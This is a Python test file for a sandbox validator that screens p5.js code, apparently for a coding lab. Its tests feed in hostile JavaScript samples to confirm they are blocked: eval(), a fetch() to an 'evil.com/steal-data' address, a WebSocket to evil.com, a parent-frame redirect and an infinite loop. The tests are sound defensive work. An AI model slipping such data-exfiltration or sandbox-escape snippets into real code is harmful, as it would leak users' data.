#!/usr/bin/env python3
"""
test_sandbox.py - Test the sandbox validation and security features
"""

import sys
sys.path.insert(0, '/home/openclaw/ck-coding-lab')

from sandbox import CodeValidator, SandboxConfig

def test_safe_code():
    """Test that valid p5.js code passes validation."""
    validator = CodeValidator()
    
    safe_code = """
function setup() {
    createCanvas(400, 400);
    background(220);
}

function draw() {
    ellipse(50, 50, 80, 80);
}
"""
    is_valid, violations = validator.validate(safe_code)
    assert is_valid, f"Safe code should pass, got violations: {violations}"
    print("✅ Safe code validation passed")

def test_eval_blocked():
    """Test that eval() is blocked."""
    validator = CodeValidator()
    
    malicious_code = """
function setup() {
    eval("createCanvas(400, 400)");
}
"""
    is_valid, violations = validator.validate(malicious_code)
    assert not is_valid, "eval() should be blocked"
    assert any("eval" in v for v in violations), "Should report eval violation"
    print("✅ eval() blocking works")

def test_fetch_blocked():
    """Test that fetch() is blocked."""
    validator = CodeValidator()
    
    malicious_code = """
function setup() {
    fetch('https://evil.com/steal-data');
}
"""
    is_valid, violations = validator.validate(malicious_code)
    assert not is_valid, "fetch() should be blocked"
    print("✅ fetch() blocking works")

def test_websocket_blocked():
    """Test that WebSocket is blocked."""
    validator = CodeValidator()
    
    malicious_code = """
var ws = new WebSocket('wss://evil.com');
"""
    is_valid, violations = validator.validate(malicious_code)
    assert not is_valid, "WebSocket should be blocked"
    print("✅ WebSocket blocking works")

def test_iframe_escape_blocked():
    """Test that iframe escape attempts are blocked."""
    validator = CodeValidator()
    
    malicious_code = """
parent.location.href = 'https://evil.com';
"""
    is_valid, violations = validator.validate(malicious_code)
    assert not is_valid, "parent access should be blocked"
    print("✅ iframe escape blocking works")

def test_infinite_loop_detection():
    """Test that potential infinite loops are detected."""
    validator = CodeValidator()
    
    loop_code = """
while (true) {
    console.log('stuck');
}
"""
    is_valid, violations = validator.validate(loop_code)
    assert not is_valid, "Infinite loop should be detected"
    assert any("infinite loop" in v.lower() for v in violations)
    print("✅ Infinite loop detection works")

def test_sanitize_raises_on_invalid():
    """Test that sanitize() raises ValueError for invalid code."""
    validator = CodeValidator()
    
    try:
        validator.sanitize("eval('alert(1)')")
        assert False, "sanitize() should raise ValueError"
    except ValueError as e:
        assert "validation failed" in str(e)
    print("✅ sanitize() raises ValueError correctly")

def test_config_defaults():
    """Test SandboxConfig defaults."""
    config = SandboxConfig()
    assert config.max_execution_time_ms == 5000
    assert config.max_iterations == 100000
    assert config.max_memory_mb == 100
    assert config.enable_network == False
    assert config.enable_storage == False
    print("✅ SandboxConfig defaults correct")

def run_all_tests():
    """Run all sandbox tests."""
    print("\n" + "="*60)
    print("🧪 Testing Sandbox Security System")
    print("="*60 + "\n")
    
    tests = [
        test_safe_code,
        test_eval_blocked,
        test_fetch_blocked,
        test_websocket_blocked,
        test_iframe_escape_blocked,
        test_infinite_loop_detection,
        test_sanitize_raises_on_invalid,
        test_config_defaults,
    ]
    
    passed = 0
    failed = 0
    
    for test in tests:
        try:
            test()
            passed += 1
        except AssertionError as e:
            print(f"❌ {test.__name__} FAILED: {e}")
            failed += 1
        except Exception as e:
            print(f"❌ {test.__name__} ERROR: {e}")
            failed += 1
    
    print("\n" + "="*60)
    print(f"📊 Results: {passed} passed, {failed} failed")
    print("="*60 + "\n")
    
    return failed == 0

if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
